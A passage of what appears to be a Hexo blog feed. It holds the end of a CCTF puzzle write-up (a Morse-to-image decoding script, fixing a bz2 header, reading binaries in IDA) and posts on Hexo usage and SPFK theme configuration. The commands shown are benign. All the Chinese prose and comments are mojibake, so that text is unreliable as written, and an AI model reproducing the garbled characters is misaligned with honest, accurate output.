class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="comment">#author:pcat</span></span><br><span class="line"><span class="comment">#å¿…é¡»å…ˆå®‰è£…Imageæ¨¡å—</span></span><br><span class="line">import Image</span><br><span class="line"></span><br><span class="line">dct=&#123;</span><br><span class="line"><span class="string">&#x27;A&#x27;</span>:<span class="string">&#x27;.-&#x27;</span>,<span class="string">&#x27;B&#x27;</span>:<span class="string">&#x27;-...&#x27;</span>,<span class="string">&#x27;C&#x27;</span>:<span class="string">&#x27;-.-.&#x27;</span>,<span class="string">&#x27;D&#x27;</span>:<span class="string">&#x27;-..&#x27;</span>,<span class="string">&#x27;E&#x27;</span>:<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;F&#x27;</span>:<span class="string">&#x27;..-.&#x27;</span>,<span class="string">&#x27;G&#x27;</span>:<span class="string">&#x27;--.&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;H&#x27;</span>:<span class="string">&#x27;....&#x27;</span>,<span class="string">&#x27;I&#x27;</span>:<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;J&#x27;</span>:<span class="string">&#x27;.---&#x27;</span>,<span class="string">&#x27;K&#x27;</span>:<span class="string">&#x27;-.-&#x27;</span>,<span class="string">&#x27;L&#x27;</span>:<span class="string">&#x27;.-..&#x27;</span>,<span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;--&#x27;</span>,<span class="string">&#x27;N&#x27;</span>:<span class="string">&#x27;-.&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;O&#x27;</span>:<span class="string">&#x27;---&#x27;</span>,<span class="string">&#x27;P&#x27;</span>:<span class="string">&#x27;.--.&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>:<span class="string">&#x27;--.-&#x27;</span>,<span class="string">&#x27;R&#x27;</span>:<span class="string">&#x27;.-.&#x27;</span>,<span class="string">&#x27;S&#x27;</span>:<span class="string">&#x27;...&#x27;</span>,<span class="string">&#x27;T&#x27;</span>:<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;U&#x27;</span>:<span class="string">&#x27;..-&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;V&#x27;</span>:<span class="string">&#x27;...-&#x27;</span>,<span class="string">&#x27;W&#x27;</span>:<span class="string">&#x27;.--&#x27;</span>,<span class="string">&#x27;X&#x27;</span>:<span class="string">&#x27;-..-&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>:<span class="string">&#x27;-.--&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>:<span class="string">&#x27;--..&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;0&#x27;</span>:<span class="string">&#x27;-----&#x27;</span>,<span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;.----&#x27;</span>,<span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;..---&#x27;</span>,<span class="string">&#x27;3&#x27;</span>:<span class="string">&#x27;...--&#x27;</span>,<span class="string">&#x27;4&#x27;</span>:<span class="string">&#x27;....-&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;5&#x27;</span>:<span class="string">&#x27;.....&#x27;</span>,<span class="string">&#x27;6&#x27;</span>:<span class="string">&#x27;-....&#x27;</span>,<span class="string">&#x27;7&#x27;</span>:<span class="string">&#x27;--...&#x27;</span>,<span class="string">&#x27;8&#x27;</span>:<span class="string">&#x27;---..&#x27;</span>,<span class="string">&#x27;9&#x27;</span>:<span class="string">&#x27;----.&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;.&#x27;</span>:<span class="string">&#x27;.-.-.-&#x27;</span>,<span class="string">&#x27;:&#x27;</span>:<span class="string">&#x27;---...&#x27;</span>,<span class="string">&#x27;,&#x27;</span>:<span class="string">&#x27;--..--&#x27;</span>,<span class="string">&#x27;;&#x27;</span>:<span class="string">&#x27;-.-.-.&#x27;</span>,<span class="string">&#x27;?&#x27;</span>:<span class="string">&#x27;..--..&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;=&#x27;</span>:<span class="string">&#x27;-...-&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>:<span class="string">&#x27;.----.&#x27;</span>,<span class="string">&#x27;/&#x27;</span>:<span class="string">&#x27;-..-.&#x27;</span>,<span class="string">&#x27;!&#x27;</span>:<span class="string">&#x27;-.-.--&#x27;</span>,<span class="string">&#x27;-&#x27;</span>:<span class="string">&#x27;-....-&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;_&#x27;</span>:<span class="string">&#x27;..--.-&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>:<span class="string">&#x27;.-..-.&#x27;</span>,<span class="string">&#x27;(&#x27;</span>:<span class="string">&#x27;-.--.&#x27;</span>,<span class="string">&#x27;)&#x27;</span>:<span class="string">&#x27;-.--.-&#x27;</span>,<span class="string">&#x27;$&#x27;</span>:<span class="string">&#x27;...-..-&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;&amp;&#x27;</span>:<span class="string">&#x27;.-...&#x27;</span>,<span class="string">&#x27;@&#x27;</span>:<span class="string">&#x27;.--.-.&#x27;</span>,<span class="string">&#x27;+&#x27;</span>:<span class="string">&#x27;.-.-.&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def readRe():</span><br><span class="line">f=open(<span class="string">&#x27;reverse&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).<span class="built_in">read</span>().strip()</span><br><span class="line">lst=f.split(<span class="string">&#x27;  &#x27;</span>)</span><br><span class="line"><span class="comment">#é”®å€¼äº¤æ¢</span></span><br><span class="line">dct2=&#123;v:k <span class="keyword">for</span> k,v <span class="keyword">in</span> dct.items()&#125;</span><br><span class="line"><span class="comment">#æ‘©æ–¯å¯†ç è§£å¯†</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(lst)):</span><br><span class="line">lst[i]=dct2[lst[i]]</span><br><span class="line"><span class="built_in">return</span> <span class="string">&quot;&quot;</span>.join(lst)</span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line"><span class="comment">#è¯»å–reverseæ–‡ä»¶</span></span><br><span class="line">s=readRe()</span><br><span class="line"><span class="comment">#ç»˜åˆ¶å›¾</span></span><br><span class="line">n=32</span><br><span class="line">width,height=n,n</span><br><span class="line">bgcolor=(255,255,255)</span><br><span class="line">im= Image.new(<span class="string">&#x27;RGB&#x27;</span>,(width,height),bgcolor)</span><br><span class="line">pix=im.load()</span><br><span class="line">i=0</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(0,height):</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> xrange(0,width):</span><br><span class="line"><span class="keyword">if</span> s[i]==<span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">pix[x,y]=(0,0,0)</span><br><span class="line">i+=1</span><br><span class="line"><span class="comment">#å›¾åƒæ—‹è½¬180åº¦</span></span><br><span class="line">out=im.rotate(180)</span><br><span class="line">out.show()</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">foo()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;ok&#x27;</span></span><br></pre></td></tr></table></figure><p>æ¥ç€æ®ç”Ÿæˆäº†æˆ‘è¦çš„falg </p><h3 id="True-or-False"><a href="#True-or-False" class="headerlink" title="True or False?"></a>True or False?</h3><p>  è¿™é¢˜é©¬å¸ˆå‚…å“æ­»æˆ‘äº† å±…ç„¶è¿‡æ¥é—®æˆ‘æœ‰æ²¡æœ‰æ€è·¯ å—å® è‹¥æƒŠ å—å® è‹¥æƒŠ   </p><p>hintè¯´äº†ä»–æ˜¯ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ ç„¶è€Œå°è¯•äº†å„ç§å‹ç¼©æœæ–­æ”¾å¼ƒâ€¦<br>  ä¹‹ååˆæ”¾å‡ºhint Bz2 æœæ–­ç™¾åº¦è±ç„¶å¼€æœ—<del>~</del><br>  ç„¶ååˆå‚»é€¼äº†ä¸€å›ï¼Œæ²¡æœ‰åŠ æ–‡ä»¶å¤´éš¾æ€ªæ­»æ´»è§£å‹ä¸å‡ºæ¥<br>  ç”¨winhexæ‰“å¼€  </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_true-or-false-bin.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cctf_true-or-false-bin.jpg"></a></p><p> ç™¾åº¦ä¸€ä¸‹BZ2å‹ç¼©æ–‡ä»¶çš„æ–‡ä»¶å¤´åŠ ä¸Š  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar   -jxvf    aaaa.tar.bz2</span><br></pre></td></tr></table></figure><p> å‘½ä»¤è§£å‹ç¼©â€¦<br> å¾—åˆ°ä¸¤ä¸ªBinæ–‡ä»¶   </p><p> ç¨å¾®é€†å‘çœ‹ä¸€ä¸‹<br> å› ä¸ºIDAä¸æ˜¯å¾ˆç†Ÿæ‚‰  åœ¨è¿™é‡Œæˆ‘å­¦ä¹ åˆ°äº†IDAä¸ä»…ä»…æœ‰F5è¿™ä¸ªåŠŸèƒ½è¿˜æœ‰Ré”®â€¦.è¿™é‡Œä¸Šé¾™å¸ˆå‚…çš„å›¾</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/true-or-false2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/true-or-false2.png"></a></p><p> OK æŒ‰é¡ºåºæ‹¼æ¥å°±å¾—åˆ°falgäº†</p><hr><p>ç„¶åé…±æ²¹å°±æ‰“åˆ°è¿™é‡Œäº†~</p><p>é…±æ²¹å…šè¦ç¡è§‰äº†â€¦</p><p>æ˜å¤©çœ‹å®ŒWPæœ‰æƒ³æ³•å†æ¥æ›´æ–°â€¦.</p><p><a href="http://7xt21h.com2.z0.glb.clouddn.com/CCTF.zip">æ–‡ä»¶</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo ä½¿ç”¨</title>
      <link href="Hexo-Use.html"/>
      <url>Hexo-Use.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å†™æ–‡ç« "><a href="#å†™æ–‡ç« " class="headerlink" title="å†™æ–‡ç« "></a>å†™æ–‡ç« </h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">æ–‡ç« å¼€å¤´ï¼š</span><br><span class="line">tile: name</span><br><span class="line">date: 2016-04-14 00:26:19</span><br><span class="line">description: <span class="comment">#æè¿°</span></span><br><span class="line">categories: <span class="comment">#åˆ†ç±»</span></span><br><span class="line">tags: <span class="comment">#æ ‡ç­¾</span></span><br><span class="line">- åšå®¢</span><br><span class="line">- hexo</span><br><span class="line">toc: <span class="literal">true</span> <span class="comment">#ç”Ÿæˆç›®å½•</span></span><br><span class="line">author: </span><br><span class="line">comments:</span><br><span class="line">original:</span><br><span class="line">permalink: <span class="comment"># æŒ‡å®šé“¾æ¥</span></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">   ä»¥ä¸Šä¸ºæ‘˜è¦</span><br><span class="line"> &lt;!--more--&gt;</span><br><span class="line">    </span><br><span class="line">       æ­£æ–‡</span><br><span class="line">      </span><br></pre></td></tr></table></figure><h2 id="æ–‡ç« å›¾ç‰‡è·¯å¾„"><a href="#æ–‡ç« å›¾ç‰‡è·¯å¾„" class="headerlink" title="æ–‡ç« å›¾ç‰‡è·¯å¾„"></a>æ–‡ç« å›¾ç‰‡è·¯å¾„</h2><p> Hexoå¦‚ä½•æ–¹å¼å›¾ç‰‡ï¼Œå›¾ç‰‡åº”è¯¥æ”¾ç½®åˆ°å“ªé‡Œï¼Œä¸ä¼šåº”ä¸ºä¸Šä¼ è€Œè¦†ç›–æ‰ã€‚ç„¶åæŠŠæ–‡ç« é‡Œçš„index.mdåˆ é™¤ï¼Œå°†æ–‡ä»¶å­˜æ”¾åœ¨resourceæ–‡ä»¶å¤¹ä¸­é—´ã€‚  </p><figure class="highlight plain"><figcaption><span>bash</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">å‘å¸ƒé¡µé¢</span><br><span class="line">$ hexo new page &quot;name&quot;</span><br><span class="line"></span><br><span class="line">    uuhike@uuhike-pc mingw64 &#x2F;d&#x2F;hexo (master)</span><br><span class="line">$ hexo new page &quot;resoures&quot;</span><br><span class="line">   INFO Creatd: D:\Hexo\Hexo\source\resoures\index.md</span><br></pre></td></tr></table></figure><p>å‚è€ƒèµ„æ–™ï¼š<br>   <a href="http://luuman.github.io/2015/12/25/Hexo/#u6587_u7AE0_u56FE_u7247_u8DEF_u5F84">ä½¿ç”¨HEXO</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo ä¸»é¢˜ï¼šSPFK</title>
      <link href="Hexo-Theme.html"/>
      <url>Hexo-Theme.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>ã€€ã€€** Hexo ä¸»é¢˜ï¼š**ç”¨äº†yiliaä¸»é¢˜ä¸€æ®µæ—¶é—´ï¼Œæ„Ÿè§‰è¿˜æœ‰å¾ˆå¤šå¯ä»¥æé«˜çš„åœ°æ–¹ï¼Œå°±æŸ¥é˜…èµ„æ–™ï¼Œå¯¹å…¶è¿›è¡Œç²—ç±»çš„ä¿®æ”¹ï¼Œ<br>ä½†æ˜¯ï¼Œæœ‰å…¶å®è¿˜æœ‰å¾ˆå¤šä¸å®Œå–„çš„åœ°æ–¹ï¼Œæ¬¢è¿å¤§å®¶å‰æ§åœºã€‚æ²¡æƒ³åˆ°ï¼Œè¿™ä¹ˆå¤šäººå–œæ¬¢é»‘è‰²ç‰ˆæœ¬çš„ï¼Œå»ºè®®ä¸æ˜¯æ¯ä¸ªäººéƒ½å–œæ¬¢æˆ‘çš„è¿™äº›åŠŸèƒ½ï¼Œæ‰€ä»¥å‡†å¤‡ä¸ªåŸºç¡€ç‰ˆæœ¬ï¼Œæ’ä»¶å¯ä»¥çœ‹æ•™ç¨‹è‡ªè¡Œå®‰è£…ã€‚</p><span id="more"></span><h2 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https:&#x2F;&#x2F;github.com&#x2F;luuman&#x2F;hexo-theme-spfk.git themes&#x2F;spfk</span><br></pre></td></tr></table></figure><h3 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>ä¿®æ”¹hexoæ ¹ç›®å½•ä¸‹çš„ <code>_config.yml</code> ï¼š <code>theme: spfk</code></p><h3 id="æ›´æ–°"><a href="#æ›´æ–°" class="headerlink" title="æ›´æ–°"></a>æ›´æ–°</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd themes&#x2F;spfk</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure><h2 id="é…ç½®-1"><a href="#é…ç½®-1" class="headerlink" title="é…ç½®"></a>é…ç½®</h2><p>å…³äºé…ç½®æ–‡ä»¶ï¼Œ</p><p>ä¸»é¢˜é…ç½®æ–‡ä»¶åœ¨ä¸»ç›®å½•ä¸‹çš„<code>_config.yml</code>ï¼š<a href="http://luuman.github.io/2015/12/21/GitHub+Hexo/" title="ä¸»é¢˜é…ç½®æ–‡ä»¶">_config.yml</a></p><p>ç›¸å…³æ’ä»¶çš„å®‰è£…ï¼šè¯·å‚ç…§<a href="http://localhost:4000/2015/12/27/Hexo-plug/" title="è¯·å‚ç…§å®‰è£…">Hexoæ’ä»¶å®‰è£…</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">### Header</span><br><span class="line">J:\Hexo\Hexo\themes\spfk\_config.yml</span><br><span class="line">menu:</span><br><span class="line">  ä¸»é¡µ: &#x2F;</span><br><span class="line">  æ‰€æœ‰æ–‡ç« : &#x2F;archives</span><br><span class="line">  # éšç¬”: &#x2F;tags&#x2F;éšç¬”</span><br><span class="line"></span><br><span class="line">    #æ˜¯å¦å¼€å¯å¤šè¯´è¯„è®ºï¼Œå¡«å†™ä½ åœ¨å¤šè¯´ç”³è¯·çš„é¡¹ç›®åç§° duoshuo: duoshuo-keyï¼ˆhttp:&#x2F;&#x2F;duoshuo-key.duoshuo.com&#x2F;ï¼‰</span><br><span class="line">    #è‹¥ä½¿ç”¨disqusï¼Œè¯·åœ¨åšå®¢configæ–‡ä»¶ä¸­å¡«å†™disqus_shortnameï¼Œå¹¶å…³é—­å¤šè¯´è¯„è®º</span><br><span class="line">    duoshuo: true</span><br><span class="line"></span><br><span class="line">ç½‘é¡µä¾§è¾¹æ èƒŒæ™¯:</span><br><span class="line"></span><br><span class="line"># Background | èƒŒæ™¯</span><br><span class="line">## &quot;background_sum&quot;: show images form &#x2F;source&#x2F;background&#x2F;çš„å›¾ç‰‡æ•°ç›®background_sum: 24</span><br><span class="line">## &quot;on: true&quot;: è‡ªåŠ¨éšæœºæ˜¾ç¤ºè¿™5å¼ å›¾ç‰‡</span><br><span class="line">## &quot;on: false&quot;: è‡ªå®šä¹‰æ˜¾ç¤ºå›¾ç‰‡è®¾ç½®ï¼Œbackground_image: 109</span><br><span class="line">background:</span><br><span class="line">  on: true</span><br><span class="line">  #on: false</span><br><span class="line">  background_sum: 24</span><br><span class="line">  background_image: 109</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="å¤šè¯´è¯„è®º"><a href="#å¤šè¯´è¯„è®º" class="headerlink" title="å¤šè¯´è¯„è®º"></a>å¤šè¯´è¯„è®º</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">duoshuo: </span><br><span class="line">  on: true</span><br><span class="line">  domain: luuman</span><br><span class="line">  # æ˜¯å¦å¼€å¯å¤šè¯´è¯„è®ºï¼Œhttp:&#x2F;&#x2F;duoshuo.com&#x2F;create-site&#x2F;</span><br><span class="line">  # ä½¿ç”¨ä¸Šé¢ç½‘å€ç™»é™†ä½ çš„å¤šè¯´ï¼Œç„¶ååˆ›å»ºç«™ç‚¹ï¼Œåœ¨ domain ä¸­å¡«å…¥ä½ è®¾å®šçš„åŸŸåå‰åŠéƒ¨åˆ†</span><br><span class="line">  # http:&#x2F;&#x2F;&lt;è¦å¡«çš„éƒ¨åˆ†&gt;.duoshuo.com (domainåªå¡«ä¸Š&lt;&gt;é‡Œçš„å†…å®¹ï¼Œä¸è¦å¡«æ•´ä¸ªç½‘å€)</span><br><span class="line"></span><br><span class="line">J:\Hexo\Hexo\themes\spfk\source\css\å¤šè¯´.css</span><br><span class="line"></span><br><span class="line">æ·»åŠ æ–¹æ³•ï¼š</span><br><span class="line">æ·»åŠ æ–¹æ³•ï¼šæ‰“å¼€ã€Œåå°ã€ &gt; ã€Œå¤šè¯´è¯„è®ºã€ &gt; ã€Œè®¾ç½®ã€ &gt; ã€ŒåŸºæœ¬è®¾ç½®ã€ &gt; ç„¶åæŠŠæ ·å¼ç²˜è´´åˆ°ã€Œè‡ªå®šä¹‰CSSã€æ–‡æœ¬æ¡† &gt; ã€Œä¿å­˜ã€</span><br><span class="line"></span><br><span class="line">å…·ä½“æ ·å¼è¯·å‚ç…§ï¼š[å¤šè¯´.css](https:&#x2F;&#x2F;github.com&#x2F;luuman&#x2F;Hexo&#x2F;blob&#x2F;master&#x2F;themes&#x2F;spfk&#x2F;source&#x2F;css&#x2F;%E5%A4%9A%E8%AF%B4.css &quot;CSSæ ·å¼é›†åˆ&quot;)</span><br></pre></td></tr></table></figure><h3 id="å¤´åƒ"><a href="#å¤´åƒ" class="headerlink" title="å¤´åƒ"></a>å¤´åƒ</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¤´åƒå°ºå¯¸å¤§æ¦‚200*200px</span><br><span class="line">E:\Github\Hexo\themes\spfk\source\img\head.jpg</span><br></pre></td></tr></table></figure><h3 id="Apple-Touch-icon-è‹¹æœå›¾æ ‡"><a href="#Apple-Touch-icon-è‹¹æœå›¾æ ‡" class="headerlink" title="Apple Touch icon è‹¹æœå›¾æ ‡:"></a>Apple Touch icon è‹¹æœå›¾æ ‡:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ›¿æ¢è·¯å¾„: &#x2F;spfk&#x2F;source&#x2F;apple-touch-icon.png</span><br><span class="line"></span><br><span class="line">E:\Github\Hexo\themes\spfk\source\img\favicon.png</span><br></pre></td></tr></table></figure><h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Background | èƒŒæ™¯</span><br><span class="line">## &quot;background_sum&quot;: show images form &#x2F;source&#x2F;background&#x2F;çš„å›¾ç‰‡æ•°ç›®</span><br><span class="line">## &quot;on: true&quot;: è‡ªåŠ¨éšæœºæ˜¾ç¤ºè¿™5å¼ å›¾ç‰‡</span><br><span class="line">## &quot;on: false&quot;: è‡ªå®šä¹‰æ˜¾ç¤ºå›¾ç‰‡è®¾ç½® background_image: 5</span><br><span class="line">background:</span><br><span class="line">  on: true</span><br><span class="line">  #on: false</span><br><span class="line">  background_sum: 24</span><br><span class="line">  background_image: 109</span><br></pre></td></tr></table></figure><h3 id="æ–‡ç« æ‘˜è¦"><a href="#æ–‡ç« æ‘˜è¦" class="headerlink" title="æ–‡ç« æ‘˜è¦"></a>æ–‡ç« æ‘˜è¦</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">title: å‰ç«¯çŸ¥è¯†ä½“ç³»</span><br><span class="line">date: 2016-01-16 13:58:41</span><br><span class="line">description: </span><br><span class="line">categories:</span><br><span class="line">- HTML ä¹¦ç±</span><br><span class="line">- HTML ä¹¦ç±</span><br><span class="line">tags:</span><br><span class="line">- HTML æ ‡ç­¾ </span><br><span class="line">- HTML æ ‡ç­¾</span><br><span class="line">toc: true æ–‡ç« ç›®å½•</span><br><span class="line">author:</span><br><span class="line">comments:</span><br><span class="line">original:</span><br><span class="line">permalink: </span><br><span class="line">---</span><br><span class="line">ã€€ã€€** å‰ç«¯çŸ¥è¯†ä½“ç³»ï¼š**&lt;Excerpt in index | é¦–é¡µæ‘˜è¦&gt; </span><br><span class="line"></span><br><span class="line">+ &lt;!-- more --&gt;</span><br><span class="line">&lt;The rest of contents | ä½™ä¸‹å…¨æ–‡&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="404-Page"><a href="#404-Page" class="headerlink" title="404 Page:"></a>404 Page:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo new page 404</span><br><span class="line">And then set permalink: &#x2F;404 in &#x2F;source&#x2F;404&#x2F;index.md front matter.</span><br><span class="line">åœ¨ Hexo ä¸­åˆ›å»ºåŒ¹é…ä¸»é¢˜çš„404é¡µé¢</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ä¸»é¢˜ç»“æ„ï¼š"><a href="#ä¸»é¢˜ç»“æ„ï¼š" class="headerlink" title="ä¸»é¢˜ç»“æ„ï¼š"></a>ä¸»é¢˜ç»“æ„ï¼š</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â”œâ”€â”€ languages            #å¤šè¯­è¨€</span><br><span class="line">|   â”œâ”€â”€ default.yml      #é»˜è®¤è¯­è¨€</span><br><span class="line">|   â””â”€â”€ zh-CN.yml        #ä¸­æ–‡è¯­è¨€</span><br><span class="line">â”œâ”€â”€ layout               #å¸ƒå±€ï¼Œæ ¹ç›®å½•ä¸‹çš„*.ejsæ–‡ä»¶æ˜¯å¯¹ä¸»é¡µï¼Œåˆ†é¡µï¼Œå­˜æ¡£ç­‰çš„æ§åˆ¶</span><br><span class="line">|   â”œâ”€â”€ _partial         #å±€éƒ¨çš„å¸ƒå±€ï¼Œæ­¤ç›®å½•ä¸‹çš„*.ejsæ˜¯å¯¹å¤´å°¾ç­‰å±€éƒ¨çš„æ§åˆ¶</span><br><span class="line">|   â””â”€â”€ _widget          #å°æŒ‚ä»¶çš„å¸ƒå±€ï¼Œé¡µé¢ä¸‹æ–¹å°æŒ‚ä»¶çš„æ§åˆ¶</span><br><span class="line">â”œâ”€â”€ source               #æºç </span><br><span class="line">|   â”œâ”€â”€ css              #cssæºç  </span><br><span class="line">|   |   â”œâ”€â”€ _base        #*.stylåŸºç¡€css</span><br><span class="line">|   |   â”œâ”€â”€ _partial     #*.stylå±€éƒ¨css</span><br><span class="line">|   |   â”œâ”€â”€ fonts        #å­—ä½“</span><br><span class="line">|   |   â”œâ”€â”€ images       